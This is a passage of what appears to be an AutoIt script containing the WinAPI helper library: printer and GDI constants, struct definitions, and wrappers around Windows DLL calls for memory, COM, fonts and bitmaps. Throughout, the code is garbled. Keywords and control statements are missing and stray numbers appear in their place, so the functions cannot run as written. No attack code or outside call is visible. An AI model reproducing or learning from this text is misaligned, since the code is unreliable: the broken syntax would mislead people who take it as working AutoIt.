0$dmpaper_fanfold_std_german = 40
0$dmpaper_fanfold_lgl_german = 41
0$dmpaper_iso_b4 = 42
0$dmpaper_japanese_postcard = 43
0$dmpaper_9x11 = 44
0$dmpaper_10x11 = 45
0$dmpaper_15x11 = 46
0$dmpaper_env_invite = 47
0$dmpaper_reserved_48 = 48
0$dmpaper_reserved_49 = 49
0$dmpaper_letter_extra = 50
0$dmpaper_legal_extra = 51
0$dmpaper_tabloid_extra = 52
0$dmpaper_a4_extra = 53
0$dmpaper_letter_transverse = 54
0$dmpaper_a4_transverse = 55
0$dmpaper_letter_extra_transverse = 56
0$dmpaper_a_plus = 57
0$dmpaper_b_plus = 58
0$dmpaper_letter_plus = 59
0$dmpaper_a4_plus = 60
0$dmpaper_a5_transverse = 61
0$dmpaper_b5_transverse = 62
0$dmpaper_a3_extra = 63
0$dmpaper_a5_extra = 64
0$dmpaper_b5_extra = 65
0$dmpaper_a2 = 66
0$dmpaper_a3_transverse = 67
0$dmpaper_a3_extra_transverse = 68
0$dmpaper_dbl_japanese_postcard = 69
0$dmpaper_a6 = 70
0$dmpaper_jenv_kaku2 = 71
0$dmpaper_jenv_kaku3 = 72
0$dmpaper_jenv_chou3 = 73
0$dmpaper_jenv_chou4 = 74
0$dmpaper_letter_rotated = 75
0$dmpaper_a3_rotated = 76
0$dmpaper_a4_rotated = 77
0$dmpaper_a5_rotated = 78
0$dmpaper_b4_jis_rotated = 79
0$dmpaper_b5_jis_rotated = 80
0$dmpaper_japanese_postcard_rotated = 81
0$dmpaper_dbl_japanese_postcard_rotated = 82
0$dmpaper_a6_rotated = 83
0$dmpaper_jenv_kaku2_rotated = 84
0$dmpaper_jenv_kaku3_rotated = 85
0$dmpaper_jenv_chou3_rotated = 86
0$dmpaper_jenv_chou4_rotated = 87
0$dmpaper_b6_jis = 88
0$dmpaper_b6_jis_rotated = 89
0$dmpaper_12x11 = 90
0$dmpaper_jenv_you4 = 91
0$dmpaper_jenv_you4_rotated = 92
0$dmpaper_p16k = 93
0$dmpaper_p32k = 94
0$dmpaper_p32kbig = 95
0$dmpaper_penv_1 = 96
0$dmpaper_penv_2 = 97
0$dmpaper_penv_3 = 98
0$dmpaper_penv_4 = 99
0$dmpaper_penv_5 = 100
0$dmpaper_penv_6 = 101
0$dmpaper_penv_7 = 102
0$dmpaper_penv_8 = 103
0$dmpaper_penv_9 = 104
0$dmpaper_penv_10 = 105
0$dmpaper_p16k_rotated = 106
0$dmpaper_p32k_rotated = 107
0$dmpaper_p32kbig_rotated = 108
0$dmpaper_penv_1_rotated = 109
0$dmpaper_penv_2_rotated = 110
0$dmpaper_penv_3_rotated = 111
0$dmpaper_penv_4_rotated = 112
0$dmpaper_penv_5_rotated = 113
0$dmpaper_penv_6_rotated = 114
0$dmpaper_penv_7_rotated = 115
0$dmpaper_penv_8_rotated = 116
0$dmpaper_penv_9_rotated = 117
0$dmpaper_penv_10_rotated = 118
0$dmpaper_user = 256
0$dmbin_upper = 1
0$dmbin_lower = 2
0$dmbin_middle = 3
0$dmbin_manual = 4
0$dmbin_envelope = 5
0$dmbin_envmanual = 6
0$dmbin_auto = 7
0$dmbin_tractor = 8
0$dmbin_smallfmt = 9
0$dmbin_largefmt = 10
0$dmbin_largecapacity = 11
0$dmbin_cassette = 14
0$dmbin_formsource = 15
0$dmbin_user = 256
0$dmres_draft = -1
0$dmres_low = -2
0$dmres_medium = -3
0$dmres_high = -4
0$dmdo_default = 0
0$dmdo_90 = 1
0$dmdo_180 = 2
0$dmdo_270 = 3
0$dmdfo_default = 0
0$dmdfo_stretch = 1
0$dmdfo_center = 2
0$dmcolor_monochrome = 1
0$dmcolor_color = 2
0$dmdup_simplex = 1
0$dmdup_vertical = 2
0$dmdup_horizontal = 3
0$dmtt_bitmap = 1
0$dmtt_download = 2
0$dmtt_subdev = 3
0$dmtt_download_outline = 4
0$dmcollate_false = 0
0$dmcollate_true = 1
0$dm_grayscale = 1
0$dm_interlaced = 2
0$dmnup_system = 1
0$dmnup_oneup = 2
0$dmicmmethod_none = 1
0$dmicmmethod_system = 2
0$dmicmmethod_driver = 3
0$dmicmmethod_device = 4
0$dmicmmethod_user = 256
0$dmicm_saturate = 1
0$dmicm_contrast = 2
0$dmicm_colorimetric = 3
0$dmicm_abs_colorimetric = 4
0$dmicm_user = 256
0$dmmedia_standard = 1
0$dmmedia_transparency = 2
0$dmmedia_glossy = 3
0$dmmedia_user = 256
0$dmdither_none = 1
0$dmdither_coarse = 2
0$dmdither_fine = 3
0$dmdither_lineart = 4
0$dmdither_errordiffusion = 5
0$dmdither_reserved6 = 6
0$dmdither_reserved7 = 7
0$dmdither_reserved8 = 8
0$dmdither_reserved9 = 9
0$dmdither_grayscale = 10
0$dmdither_user = 256
0$enum_current_settings = -1
0$enum_registry_settings = -2
0$device_fonttype = 2
0$raster_fonttype = 1
0$truetype_fonttype = 4
0$ntm_bold = 32
0$ntm_dsig = 2097152
0$ntm_italic = 1
0$ntm_multiplemaster = 524288
0$ntm_nonnegative_ac = 65536
0$ntm_ps_opentype = 131072
0$ntm_regular = 64
0$ntm_tt_opentype = 262144
0$ntm_type1 = 1048576
0$floodfillborder = 0
0$floodfillsurface = 1
0$ad_counterclockwise = 1
0$ad_clockwise = 2
0$dcb_accumulate = 2
0$dcb_disable = 8
0$dcb_enable = 4
0$dcb_reset = 1
0$dcb_set = ($dcb_reset, $dcb_accumulate)
0$obj_bitmap = 7
0$obj_brush = 2
0$obj_colorspace = 14
0$obj_dc = 3
0$obj_enhmetadc = 12
0$obj_enhmetafile = 13
0$obj_extpen = 11
0$obj_font = 6
0$obj_memdc = 10
0$obj_metadc = 4
0$obj_metafile = 9
0$obj_pal = 5
0$obj_pen = 1
0$obj_region = 8
0$dcx_window = 1
0$dcx_cache = 2
0$dcx_parentclip = 32
0$dcx_clipsiblings = 16
0$dcx_clipchildren = 8
0$dcx_noresetattrs = 4
0$dcx_lockwindowupdate = 1024
0$dcx_excludergn = 64
0$dcx_intersectrgn = 128
0$dcx_intersectupdate = 512
0$dcx_validate = 2097152
0$ggo_bezier = 3
0$ggo_bitmap = 1
0$ggo_glyph_index = 128
0$ggo_gray2_bitmap = 4
0$ggo_gray4_bitmap = 5
0$ggo_gray8_bitmap = 6
0$ggo_metrics = 0
0$ggo_native = 2
0$ggo_unhinted = 256
0$gm_compatible = 1
0$gm_advanced = 2
0$mm_anisotropic = 8
0$mm_hienglish = 5
0$mm_himetric = 3
0$mm_isotropic = 7
0$mm_loenglish = 4
0$mm_lometric = 2
0$mm_text = 1
0$mm_twips = 6
0$r2_black = 1
0$r2_copypen = 13
0$r2_last = 16
0$r2_masknotpen = 3
0$r2_maskpen = 9
0$r2_maskpennot = 5
0$r2_mergenotpen = 12
0$r2_mergepen = 15
0$r2_mergepennot = 14
0$r2_nop = 11
0$r2_not = 6
0$r2_notcopypen = 4
0$r2_notmaskpen = 8
0$r2_notmergepen = 2
0$r2_notxorpen = 10
0$r2_white = 16
0$r2_xorpen = 7
0$blackonwhite = 1
0$coloroncolor = 3
0$halftone = 4
0$whiteonblack = 2
0$stretch_andscans = $blackonwhite
0$stretch_deletescans = $coloroncolor
0$stretch_halftone = $halftone
0$stretch_orscans = $whiteonblack
0$ta_baseline = 24
0$ta_bottom = 8
0$ta_top = 0
0$ta_center = 6
0$ta_left = 0
0$ta_right = 2
0$ta_noupdatecp = 0
0$ta_rtlreading = 256
0$ta_updatecp = 1
0$vta_baseline = $ta_baseline
0$vta_bottom = $ta_right
0$vta_top = $ta_left
0$vta_center = $ta_center
0$vta_left = $ta_bottom
0$vta_right = $ta_top
0$udf_bgr = 1
0$udf_rgb = 0
0$mwt_identity = 1
0$mwt_leftmultiply = 2
0$mwt_rightmultiply = 3
0$mwt_set = 4
0$monitor_defaulttonearest = 2
0$monitor_defaulttonull = 0
0$monitor_defaulttoprimary = 1
0$pt_bezierto = 4
0$pt_lineto = 2
0$pt_moveto = 6
0$pt_closefigure = 1
0$coinit_apartmentthreaded = 2
0$coinit_disable_ole1dde = 4
0$coinit_multithreaded = 0
0$coinit_speed_over_memory = 8
$__g_venum, $__g_vext = 0
$__g_hheap = 0, $__g_irgbmode = 1
0$tagosversioninfo = "struct;dword OSVersionInfoSize;dword MajorVersion;dword MinorVersion;dword BuildNumber;dword PlatformId;wchar CSDVersion[128];endstruct"
0$__winver = __winver()
_winapi_arraytostruct(3036$adata, $istart = 0, $iend = -1)
__checkerrorarraybounds($adata, $istart, $iend)534(@error + 10, @extended, 0)
$tagstruct = ""
$i = $istart15$iend
$tagstruct &= "wchar[" & (($adata[$i]) + 1) & "];"

$tdata = ($tagstruct & "wchar[1]")
$icount = 1
$i = $istart15$iend
($tdata, $icount, $adata[$i])
$icount += 1

($tdata, $icount, (0))
$tdata

_winapi_createmargins($ileftwidth, $irightwidth, $itopheight, $ibottomheight)
$tmargins = ($tagmargins)
($tmargins, 1, $ileftwidth)
($tmargins, 2, $irightwidth)
($tmargins, 3, $itopheight)
($tmargins, 4, $ibottomheight)
$tmargins

_winapi_createpoint($ix, $iy)
$tpoint = ($tagpoint)
($tpoint, 1, $ix)
($tpoint, 2, $iy)
$tpoint

_winapi_createrect($ileft, $itop, $iright, $ibottom)
$trect = ($tagrect)
($trect, 1, $ileft)
($trect, 2, $itop)
($trect, 3, $iright)
($trect, 4, $ibottom)
$trect

_winapi_createrectex($ix, $iy, $iwidth, $iheight)
$trect = ($tagrect)
($trect, 1, $ix)
($trect, 2, $iy)
($trect, 3, $ix + $iwidth)
($trect, 4, $iy + $iheight)
$trect

_winapi_createsize($iwidth, $iheight)
$tsize = ($tagsize)
($tsize, 1, $iwidth)
($tsize, 2, $iheight)
$tsize

_winapi_fatalexit($icode)
("kernel32.dll", "none", "FatalExit", "int", $icode)
@error534(@error, @extended)

_winapi_getbitmapdimension($hbitmap)
0$tagbitmap = "struct;long bmType;long bmWidth;long bmHeight;long bmWidthBytes;ushort bmPlanes;ushort bmBitsPixel;ptr bmBits;endstruct"
$tobj = ($tagbitmap)
$aret = ("gdi32.dll", "int", "GetObject", "handle", $hbitmap, "int", ($tobj), "struct*", $tobj)
@error23$aret[0]534(@error + 10, @extended, 0)
_winapi_createsize(($tobj, "bmWidth"), ($tobj, "bmHeight"))

_winapi_getstring($pstring, $bunicode = 39)
$ilength = _winapi_strlen($pstring, $bunicode)
@error23$ilength534(@error + 10, @extended, "")
$tstring = (__iif($bunicode, "wchar", "char") & "[" & ($ilength + 1) & "]", $pstring)
@error534(@error, @extended, "")
($ilength, ($tstring, 1))

_winapi_isbadreadptr($paddress, $ilength)
$aret = ("kernel32.dll", "bool", "IsBadReadPtr", "ptr", $paddress, "uint_ptr", $ilength)
@error534(@error, @extended, 40)
$aret[0]

_winapi_isbadwriteptr($paddress, $ilength)
$aret = ("kernel32.dll", "bool", "IsBadWritePtr", "ptr", $paddress, "uint_ptr", $ilength)
@error534(@error, @extended, 40)
$aret[0]

_winapi_iswow64process($ipid = 0)
$ipid5$ipid = @AutoItPID
$hprocess = ("kernel32.dll", "handle", "OpenProcess", "dword", __iif($__winver < 1536, 1024, 4096), "bool", 0, "dword", $ipid)
@error23$hprocess[0]534(@error + 20, @extended, 40)
$aret = ("kernel32.dll", "bool", "IsWow64Process", "handle", $hprocess[0], "bool*", 0)
__checkerrorclosehandle($aret, $hprocess[0])534(@error, @extended, 40)
$aret[2]

_winapi_movememory($pdestination, $psource, $ilength)
_winapi_isbadreadptr($psource, $ilength)534(10, @extended, 0)
_winapi_isbadwriteptr($pdestination, $ilength)534(11, @extended, 0)
("ntdll.dll", "none", "RtlMoveMemory", "ptr", $pdestination, "ptr", $psource, "ulong_ptr", $ilength)
@error534(@error, @extended, 0)


_winapi_pathisdirectory($spath)
$aret = ("shlwapi.dll", "bool", "PathIsDirectoryW", "wstr", $spath)
@error534(@error, @extended, 40)
$aret[0]

_winapi_strlen($pstring, $bunicode = 39)
$w = ""
$bunicode5$w = "W"
$aret = ("kernel32.dll", "int", "lstrlen" & $w, "ptr", $pstring)
@error534(@error, @extended, 0)
$aret[0]

_winapi_structtoarray(36$tstruct, $iitems = 0)
$isize = 2 * (($tstruct) / 2)
$pstruct = ($tstruct)
$isize23$pstruct534(1, 0, 0)
$tdata, $ilength, $ioffset = 0
$aresult[101] = [0]

$ilength = _winapi_strlen($pstruct + $ioffset)
$ilength5


 * (1 + $ilength) + $ioffset > $isize534(3, 0, 0)
$tdata = ("wchar[" & (1 + $ilength) & "]", $pstruct + $ioffset)
@error534(@error + 10, 0, 0)
__inc($aresult)
$aresult[$aresult[0]] = ($tdata, 1)
$aresult[0] = $iitems5


$ioffset += 2 * (1 + $ilength)
$ioffset >= $isize534(3, 0, 0)

$aresult[0]534(2, 0, 0)
__inc($aresult, -1)
$aresult

_winapi_switchcolor($icolor)
$icolor = -1534$icolor
(($icolor, 65280), (($icolor, 255), -16), (($icolor, 16711680), 16))

_winapi_zeromemory($pmemory, $ilength)
_winapi_isbadwriteptr($pmemory, $ilength)534(11, @extended, 0)
("ntdll.dll", "none", "RtlZeroMemory", "ptr", $pmemory, "ulong_ptr", $ilength)
@error534(@error, @extended, 0)


__checkerrorarraybounds(3036$adata, 36$istart, 36$iend, $ndim = 1, $idim = $ubound_dimensions)
($adata)534(1, 0, 1)
($adata, $idim) <> $ndim534(2, 0, 1)
$istart < 05$istart = 0
$iubound = ($adata) - 1
$iend < 12$iend > $iubound5$iend = $iubound
$istart > $iend534(4, 0, 1)


__checkerrorclosehandle($aret, $hfile, $blasterror = 0, $icurerr = @error, $icurext = @extended)
$icurerr13$aret[0]5$icurerr = 10
$ilasterror = _winapi_getlasterror()
("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
$icurerr5_winapi_setlasterror($ilasterror)
$blasterror5$icurext = $ilasterror
($icurerr, $icurext, $icurerr)

__dll($spath, $bpin = 40)
$aret = ("kernel32.dll", "bool", "GetModuleHandleExW", "dword", __iif($bpin, 1, 2), "wstr", $spath, "ptr*", 0)
$aret[3]5
$aresult = ("kernel32.dll", "handle", "LoadLibraryW", "wstr", $spath)
$aresult[0]5340



__enumwindowsproc($hwnd, $bvisible)
$aresult
$bvisible5
$aresult = ("user32.dll", "bool", "IsWindowVisible", "hwnd", $hwnd)
$aresult[0]5



__inc($__g_venum)
$__g_venum[$__g_venum[0][0]][0] = $hwnd
$aresult = ("user32.dll", "int", "GetClassNameW", "hwnd", $hwnd, "wstr", "", "int", 4096)
$__g_venum[$__g_venum[0][0]][1] = $aresult[2]


__fatalexit($icode, $stext = "")
$stext5($mb_systemmodal, "AutoIt", $stext)
_winapi_fatalexit($icode)

__heapalloc($isize, $babort = 40)
$aret
$__g_hheap5
$aret = ("kernel32.dll", "handle", "HeapCreate", "dword", 0, "ulong_ptr", 0, "ulong_ptr", 0)
@error23$aret[0]5__fatalexit(1, "Error allocating memory.")
$__g_hheap = $aret[0]

$aret = ("kernel32.dll", "ptr", "HeapAlloc", "handle", $__g_hheap, "dword", 8, "ulong_ptr", $isize)
@error23$aret[0]5
$babort5__fatalexit(1, "Error allocating memory.")
(@error + 30, @extended, 0)

$aret[0]

__heapfree(36$pmemory, $bcheck = 40, $icurerr = @error, $icurext = @extended)
$bcheck(3__heapvalidate($pmemory))534(@error, @extended, 0)
$aret = ("kernel32.dll", "int", "HeapFree", "ptr", $__g_hheap, "dword", 0, "ptr", $pmemory)
@error23$aret[0]534(@error + 40, @extended, 0)
$pmemory = 0
($icurerr, $icurext, 1)

__heaprealloc($pmemory, $isize, $bamount = 40, $babort = 40)
$aret, $pret
__heapvalidate($pmemory)5
$bamount(__heapsize($pmemory) >= $isize)534(1, ($pmemory))
$aret = ("kernel32.dll", "ptr", "HeapReAlloc", "handle", $__g_hheap, "dword", 8, "ptr", $pmemory, "ulong_ptr", $isize)
@error23$aret[0]5
$babort5__fatalexit(1, "Error allocating memory.")
(@error + 20, @extended, ($pmemory))

$pret = $aret[0]

$pret = __heapalloc($isize, $babort)
@error534(@error, @extended, 0)

$pret

__heapsize($pmemory, $bcheck = 40)
$bcheck(3__heapvalidate($pmemory))534(@error, @extended, 0)
$aret = ("kernel32.dll", "ulong_ptr", "HeapSize", "handle", $__g_hheap, "dword", 0, "ptr", $pmemory)
@error($aret[0] = (-1))534(@error + 50, @extended, 0)
$aret[0]

__heapvalidate($pmemory)
(3$__g_hheap)(3($pmemory))534(9, 0, 40)
$aret = ("kernel32.dll", "int", "HeapValidate", "handle", $__g_hheap, "dword", 0, "ptr", $pmemory)
@error534(@error, @extended, 40)
$aret[0]

__inc(36$adata, $iincrement = 100)

($adata, $ubound_columns)
$iincrement < 05
$adata[$adata[0][0] + 1][($adata, $ubound_columns)]

$adata[0][0] += 1
$adata[0][0] > ($adata) - 15
$adata[$adata[0][0] + $iincrement][($adata, $ubound_columns)]


($adata, $ubound_rows)
$iincrement < 05
$adata[$adata[0] + 1]

$adata[0] += 1
$adata[0] > ($adata) - 15
$adata[$adata[0] + $iincrement]







__iif($btest, $vtrue, $vfalse)
$btest ? $vtrue : $vfalse

__init($ddata)
$ilength = ($ddata)
$aret = ("kernel32.dll", "ptr", "VirtualAlloc", "ptr", 0, "ulong_ptr", $ilength, "dword", 4096, "dword", 64)
@error23$aret[0]5__fatalexit(1, "Error allocating memory.")
$tdata = ("byte[" & $ilength & "]", $aret[0])
($tdata, 1, $ddata)
$aret[0]

__rgb($icolor)
$__g_irgbmode5
$icolor = _winapi_switchcolor($icolor)

$icolor

__winver()
$tosvi = ($tagosversioninfo)
($tosvi, 1, ($tosvi))
$aret = ("kernel32.dll", "bool", "GetVersionExW", "struct*", $tosvi)
@error23$aret[0]534(@error, @extended, 0)
((($tosvi, 2), -8), ($tosvi, 3))

0$__tagwinapicom_guid = "struct;ulong Data1;ushort Data2;ushort Data3;byte Data4[8];endstruct"
_winapi_clsidfromprogid($sprogid)
$tguid = ($__tagwinapicom_guid)
$areturn = ("ole32.dll", "long", "CLSIDFromProgID", "wstr", $sprogid, "struct*", $tguid)
@error534(@error, @extended, "")
$areturn[0]534(10, $areturn[0], "")
$areturn = ("ole32.dll", "int", "StringFromGUID2", "struct*", $tguid, "wstr", "", "int", 39)
@error23$areturn[0]534(@error + 20, @extended, "")
$areturn[2]

_winapi_coinitialize($iflags = 0)
$areturn = ("ole32.dll", "long", "CoInitializeEx", "ptr", 0, "dword", $iflags)
@error534(@error, @extended, 0)
$areturn[0]534(10, $areturn[0], 0)


_winapi_cotaskmemalloc($isize)
$areturn = ("ole32.dll", "ptr", "CoTaskMemAlloc", "uint_ptr", $isize)
@error534(@error, @extended, 0)
$areturn[0]

_winapi_cotaskmemfree($pmemory)
("ole32.dll", "none", "CoTaskMemFree", "ptr", $pmemory)
@error534(@error, @extended, 0)


_winapi_cotaskmemrealloc($pmemory, $isize)
$areturn = ("ole32.dll", "ptr", "CoTaskMemRealloc", "ptr", $pmemory, "ulong_ptr", $isize)
@error534(@error, @extended, 0)
$areturn[0]

_winapi_couninitialize()
("ole32.dll", "none", "CoUninitialize")
@error534(@error, @extended, 0)


_winapi_createguid()
$tguid = ($__tagwinapicom_guid)
$areturn = ("ole32.dll", "long", "CoCreateGuid", "struct*", $tguid)
@error534(@error, @extended, "")
$areturn[0]534(10, $areturn[0], "")
$areturn = ("ole32.dll", "int", "StringFromGUID2", "struct*", $tguid, "wstr", "", "int", 65536)
@error23$areturn[0]534(@error + 20, @extended, "")
$areturn[2]

_winapi_createstreamonhglobal($hglobal = 0, $bdeleteonrelease = 39)
$areturn = ("ole32.dll", "long", "CreateStreamOnHGlobal", "handle", $hglobal, "bool", $bdeleteonrelease, "ptr*", 0)
@error534(@error, @extended, 0)
$areturn[0]534(10, $areturn[0], 0)
$areturn[3]

_winapi_gethglobalfromstream($pstream)
$areturn = ("ole32.dll", "uint", "GetHGlobalFromStream", "ptr", $pstream, "ptr*", 0)
@error534(@error, @extended, 0)
$areturn[0]534(10, $areturn[0], 0)
$areturn[2]

_winapi_progidfromclsid($sclsid)
$tguid = ($__tagwinapicom_guid)
$areturn = ("ole32.dll", "uint", "CLSIDFromString", "wstr", $sclsid, "struct*", $tguid)
@error2$areturn[0]534(@error + 20, @extended, "")
$areturn = ("ole32.dll", "uint", "ProgIDFromCLSID", "ptr", ($tguid), "ptr*", 0)
@error534(@error, @extended, "")
$areturn[0]534(10, $areturn[0], "")
$sid = _winapi_getstring($areturn[2])
_winapi_cotaskmemfree($areturn[2])
$sid

_winapi_releasestream($pstream)
$areturn = ("oleaut32.dll", "long", "DispCallFunc", "ptr", $pstream, "ulong_ptr", 8 * (1 + @AutoItX64), "uint", 4, "ushort", 23, "uint", 0, "ptr", 0, "ptr", 0, "str", "")
@error534(@error, @extended, 0)
$areturn[0]534(10, $areturn[0], 0)


0$tagbitmap = "struct;long bmType;long bmWidth;long bmHeight;long bmWidthBytes;ushort bmPlanes;ushort bmBitsPixel;ptr bmBits;endstruct"
0$tagbitmapv4header = "struct;dword bV4Size;long bV4Width;long bV4Height;ushort bV4Planes;ushort bV4BitCount;dword bV4Compression;dword bV4SizeImage;long bV4XPelsPerMeter;long bV4YPelsPerMeter;dword bV4ClrUsed;dword bV4ClrImportant;dword bV4RedMask;dword bV4GreenMask;dword bV4BlueMask;dword bV4AlphaMask;dword bV4CSType;int bV4Endpoints[9];dword bV4GammaRed;dword bV4GammaGreen;dword bV4GammaBlue;endstruct"
0$tagbitmapv5header = "struct;dword bV5Size;long bV5Width;long bV5Height;ushort bV5Planes;ushort bV5BitCount;dword bV5Compression;dword bV5SizeImage;long bV5XPelsPerMeter;long bV5YPelsPerMeter;dword bV5ClrUsed;dword bV5ClrImportant;dword bV5RedMask;dword bV5GreenMask;dword bV5BlueMask;dword bV5AlphaMask;dword bV5CSType;int bV5Endpoints[9];dword bV5GammaRed;dword bV5GammaGreen;dword bV5GammaBlue;dword bV5Intent;dword bV5ProfileData;dword bV5ProfileSize;dword bV5Reserved;endstruct"
0$tagcoloradjustment = "ushort Size;ushort Flags;ushort IlluminantIndex;ushort RedGamma;ushort GreenGamma;ushort BlueGamma;ushort ReferenceBlack;ushort ReferenceWhite;short Contrast;short Brightness;short Colorfulness;short RedGreenTint"
0$tagdevmode_display = "wchar DeviceName[32];ushort SpecVersion;ushort DriverVersion;ushort Size;ushort DriverExtra;dword Fields;" & $tagpoint & ";dword DisplayOrientation;dword DisplayFixedOutput;short Unused1[5];wchar Unused2[32];ushort LogPixels;dword BitsPerPel;dword PelsWidth;dword PelsHeight;dword DisplayFlags;dword DisplayFrequency"
0$tagdibsection = $tagbitmap & ";" & $tagbitmapinfoheader & ";dword dsBitfields[3];ptr dshSection;dword dsOffset"
0$tagdwm_colorization_parameters = "dword Color;dword AfterGlow;uint ColorBalance;uint AfterGlowBalance;uint BlurBalance;uint GlassReflectionIntensity; uint OpaqueBlend"
0$tagenhmetaheader = "struct;dword Type;dword Size;long rcBounds[4];long rcFrame[4];dword Signature;dword Version;dword Bytes;dword Records;ushort Handles;ushort Reserved;dword Description;dword OffDescription;dword PalEntries;long Device[2];long Millimeters[2];dword PixelFormat;dword OffPixelFormat;dword OpenGL;long Micrometers[2];endstruct"
0$tagextlogpen = "dword PenStyle;dword Width;uint BrushStyle;dword Color;ulong_ptr Hatch;dword NumEntries"
0$tagfontsignature = "dword fsUsb[4];dword fsCsb[2]"
0$tagglyphmetrics = "uint BlackBoxX;uint BlackBoxY;" & $tagpoint & ";short CellIncX;short CellIncY"
0$taglogbrush = "uint Style;dword Color;ulong_ptr Hatch"
0$taglogpen = "uint Style;dword Width;dword Color"
0$tagmat2 = "short eM11[2];short eM12[2];short eM21[2];short eM22[2]"
0$tagnewtextmetric = $tagtextmetric & ";dword ntmFlags;uint ntmSizeEM;uint ntmCellHeight;uint ntmAvgWidth"
0$tagnewtextmetricex = $tagnewtextmetric & ";" & $tagfontsignature
0$tagpanose = "struct;byte bFamilyType;byte bSerifStyle;byte bWeight;byte bProportion;byte bContrast;byte bStrokeVariation;byte bArmStyle;byte bLetterform;byte bMidline;byte bXHeight;endstruct"
0$tagoutlinetextmetric = "struct;uint otmSize;" & $tagtextmetric & ";byte otmFiller;" & $tagpanose & ";byte bugFiller[3];uint otmSelection;uint otmType;int otmCharSlopeRise;int otmCharSlopeRun;int otmItalicAngle;uint otmEMSquare;int otmAscent;int otmDescent;uint otmLineGap;uint otmCapEmHeight;uint otmXHeight;long otmFontBox[4];int otmMacAscent;int otmMacDescent;uint otmMacLineGap;uint otmMinimumPPEM;long otmSubscriptSize[2];long otmSubscriptOffset[2];long otmSuperscriptSize[2];long otmSuperscriptOffse[2];uint otmStrikeoutSize;int otmStrikeoutPosition;int otmUnderscoreSize;int otmUnderscorePosition;uint_ptr otmFamilyName;uint_ptr otmFaceName;uint_ptr otmStyleName;uint_ptr otmFullName;endstruct"
0$tagpaintstruct = "hwnd hDC;int fErase;dword rPaint[4];int fRestore;int fIncUpdate;byte rgbReserved[32]"
0$tagrgndataheader = "struct;dword Size;dword Type;dword Count;dword RgnSize;" & $tagrect & ";endstruct"
0$tagxform = "float eM11;float eM12;float eM21;float eM22;float eDx;float eDy"
_winapi_abortpath($hdc)
$aret = ("gdi32.dll", "bool", "AbortPath", "handle", $hdc)
@error534(@error, @extended, 40)
$aret[0]

_winapi_addfontmemresourceex($pdata, $isize)
$aret = ("gdi32.dll", "handle", "AddFontMemResourceEx", "ptr", $pdata, "dword", $isize, "ptr", 0, "dword*", 0)
@error534(@error, @extended, 0)
($aret[4], $aret[0])

_winapi_addfontresourceex($sfont, $iflag = 0, $bnotify = 40)
$aret = ("gdi32.dll", "int", "AddFontResourceExW", "wstr", $sfont, "dword", $iflag, "ptr", 0)
@error23$aret[0]534(@error, @extended, 0)
$bnotify5
0$wm_fontchange = 29
0$hwnd_broadcast = 65535
("user32.dll", "lresult", "SendMessage", "hwnd", $hwnd_broadcast, "uint", $wm_fontchange, "wparam", 0, "lparam", 0)

$aret[0]

_winapi_addiconoverlay($hicon, $hoverlay)
$aret, $hresult = 0, $ierror = 0
$ahdev[2] = [0, 0]
$tsize = _winapi_geticondimension($hicon)
$hil = ("comctl32.dll", "handle", "ImageList_Create", "int", ($tsize, 1), "int", ($tsize, 2), "uint", 33, "int", 2, "int", 2)
@error23$hil[0]534(@error + 10, @extended, 0)

$ahdev[0] = _winapi_create32bithicon($hicon)
@error5
$ierror = @error + 100


$aret = ("comctl32.dll", "int", "ImageList_ReplaceIcon", "handle", $hil[0], "int", -1, "handle", $ahdev[0])
@error($aret[0] = -1)5
$ierror = @error + 200


$ahdev[1] = _winapi_create32bithicon($hoverlay)
@error5
$ierror = @error + 300


$aret = ("comctl32.dll", "int", "ImageList_ReplaceIcon", "handle", $hil[0], "int", -1, "handle", $ahdev[1])
@error($aret[0] = -1)5
$ierror = @error + 400


$aret = ("comctl32.dll", "bool", "ImageList_SetOverlayImage", "handle", $hil[0], "int", 1, "int", 1)
@error23$aret[0]5
$ierror = @error + 500


$aret = ("comctl32.dll", "handle", "ImageList_GetIcon", "handle", $hil[0], "int", 0, "uint", 256)
@error23$aret[0]5
$ierror = @error + 600


$hresult = $aret[0]

("comctl32.dll", "bool", "ImageList_Destroy", "handle", $hil[0])
$i = 0151
$ahdev[$i]5
_winapi_destroyicon($ahdev[$i])


$hresult534($ierror, 0, 0)
$hresult

_winapi_adjustbitmap($hbitmap, $iwidth, $iheight, $imode = 3, $tadjustment = 0)
$tobj = ($tagbitmap)
$aret = ("gdi32.dll", "int", "GetObject", "handle", $hbitmap, "int", ($tobj), "struct*", $tobj)
@error23$aret[0]534(@error, @extended, 0)
$iwidth = -15
$iwidth = ($tobj, "bmWidth")

$iheight = -15
$iheight = ($tobj, "bmHeight")

$aret = ("user32.dll", "handle", "GetDC", "hwnd", 0)
$hdc = $aret[0]
$aret = ("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
$hdestdc = $aret[0]
$aret = ("gdi32.dll", "handle", "CreateCompatibleBitmap", "handle", $hdc, "int", $iwidth, "int", $iheight)
$hbmp = $aret[0]
$aret = ("gdi32.dll", "handle", "SelectObject", "handle", $hdestdc, "handle", $hbmp)
$hdestsv = $aret[0]
$aret = ("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
$hsrcdc = $aret[0]
$aret = ("gdi32.dll", "handle", "SelectObject", "handle", $hsrcdc, "handle", $hbitmap)
$hsrcsv = $aret[0]
_winapi_setstretchbltmode($hdestdc, $imode)5
$imode

($tadjustment)5
_winapi_setcoloradjustment($hdestdc, $tadjustment)5





$aret = _winapi_stretchblt($hdestdc, 0, 0, $iwidth, $iheight, $hsrcdc, 0, 0, ($tobj, "bmWidth"), ($tobj, "bmHeight"), 13369376)
("user32.dll", "int", "ReleaseDC", "hwnd", 0, "handle", $hdc)
("gdi32.dll", "handle", "SelectObject", "handle", $hdestdc, "handle", $hdestsv)
("gdi32.dll", "handle", "SelectObject", "handle", $hsrcdc, "handle", $hsrcsv)
("gdi32.dll", "bool", "DeleteDC", "handle", $hdestdc)
("gdi32.dll", "bool", "DeleteDC", "handle", $hsrcdc)
$aret534(10, 0, 0)
$hbmp

_winapi_alphablend($hdestdc, $ixdest, $iydest, $iwidthdest, $iheightdest, $hsrcdc, $ixsrc, $iysrc, $iwidthsrc, $iheightsrc, $ialpha, $balpha = 40)
$iblend = ((($balpha = 40), -24), (($ialpha, 255), -16))
$aret = ("gdi32.dll", "bool", "GdiAlphaBlend", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidthdest, "int", $iheightdest, "handle", $hsrcdc, "int", $ixsrc, "int", $iysrc, "int", $iwidthsrc, "int", $iheightsrc, "dword", $iblend)
@error534(@error, @extended, 40)
$aret[0]

